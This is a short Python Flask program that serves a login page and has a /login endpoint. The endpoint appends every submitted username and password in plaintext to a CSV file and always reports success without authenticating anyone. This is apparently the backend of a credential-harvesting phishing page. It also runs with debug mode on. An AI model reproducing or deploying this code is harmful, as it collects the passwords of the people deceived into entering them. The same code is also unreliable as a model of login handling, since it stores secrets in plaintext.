from flask import Flask,jsonify,redirect,url_for,request,render_template
import csv

app=Flask(__name__)
@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login",methods=["POST"])
def login():
    username=request.json.get("username")
    password=request.json.get("password")
    with open("creds.csv","a+")as f:
        csv_writer=csv.writer(f)
        csv_writer.writerow([username,password])
    return jsonify({
        "status":"sucess"
    })



if __name__=="__main__":
    app.run(debug=True)